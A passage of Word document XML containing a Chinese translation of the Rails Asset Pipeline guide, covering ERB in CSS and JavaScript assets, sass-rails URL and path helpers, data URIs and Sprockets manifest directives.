          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>In Production</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 章节会介绍这些哈希值是如何生成的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FACE0A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Sprockets 也会搜寻在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.paths</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定的所有路径，这些路径包括常规的应用程序路径和任何被 Rails engines 添加进来的路径。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06328D0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如果需要，图片也可以被组织到子目录里，然后在标签中通过指定目录名来访问它们:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="08EF84CF" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C5A22A2" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="687096249"/>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image_tag "icons/rails.png"</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67C6B883"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2.2.1 CSS 和 ERB</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA1661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asset pipeline 会自动解析 ERB. 这意味着如果你添加 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 扩展名到一个 CSS 资源 (例如， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.css.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">), 那么 helpers 如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>asset_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就可以在你的 CSS 规则中使用:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0BA64305" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43D6346E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1479149993"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>.class { background-image: url(&lt;%= asset_path 'image.png' %&gt;) }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0465CF3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这会写入被指定的资源的路径。在这个例子中，它可从任何一个资源加载路径里获得一个图像，比如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/images/image.png</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 这个图像会在这被引用。如果这个图像已经是一个指纹识别过的文件存在于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中的话，会优先引用这个路径。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50CC286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#FXIME: as a fingerprinted file. 如果你想使用 </w:t>
      </w:r>
      <w:hyperlink r:id="rId963" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">data </w:t>
        </w:r>
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>URI</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — 一个直接将图像数据嵌入到 CSS 文件里的方法 — 你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>asset_data_uri</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0BB27473" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43360D8B" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1572737351"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>#logo { background: url(&lt;%= asset_data_uri 'logo.png' %&gt;) }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="582A294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这会嵌入一个格式正确的 data URI 到 CSS 源文件里</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="647E904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注意，闭合标签不能使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>-%&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的形式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667143C3"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2.2.2 CSS 和 Sass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22417F7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当我们使用 asset pipeline时， 资源的路径必须重写而且 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sass-rails</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为下列类别提供了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>-url</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>-path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helpers(在 Sass 中使用连字符，在 Ruby 中使用下划线) : image, font, video, audio, JavaScript 和 stylesheet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C48440" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="248"/>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image-url("rails.png")</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 变成 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>url(/assets/rails.png)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F125AAD" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="248"/>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image-path("rails.png")</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 变成 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"/assets/rails.png"</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2D670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有更多类似的方式可以使用，但资源的路径和类别都必须指明：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED56821" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="249"/>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asset-url("rails.png", image)</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 变成 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>url(/assets/rails.png)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C08A0DD" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="249"/>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asset-path("rails.png", image)</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 变成 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"/assets/rails.png"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22102730"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2.2.3 JavaScript/CoffeeScript 和 ERB</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60BC1B4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如果你给 JavaScript 资源添加 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 后缀名，使它像 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.js.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，那么你就可以在 JavaScript 代码里用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>asset_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper 了。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="160452D4" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2B70420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$('#logo').attr({</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CA1ACF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src: "&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>asset_path('logo.png') %&gt;"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3175F9F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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3EEA426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这将被引用的某个特定资源的路径写入。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C02CD9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同样的， 你可以在带有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 扩展名的 CoffeeScript 文件 (e.g., </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.js.coffee.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">) 中使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>asset_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4740A7DC" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="52955DE9" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="8339990"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$('#logo').attr src: "&lt;%= asset_path('logo.png') %&gt;"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16747233"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2.3 资源清单文件和指令</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4DC8C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Sprockets 使用资源清单文件去确认哪些资源要引入并供应的。 这些资源清单文件包含一些 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>指令</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — 告诉 Sprockets 哪些文件要被按顺序引入，然后将它们连结成单个 CSS 或者 JavaScript 文件的指示。根据这些指令， Sprockets 加载这些被指定的文件，如果有必要就对它们进行加工，接着将它们连结成单个文件然后压缩它们 ( 如果 +Rails.application.config.assets.compress 为 true ). 由于只处理单个文件而不是多个， 浏览器可以发起更少的请求所以页面的加载时间将会大大的缩减。</w:t>
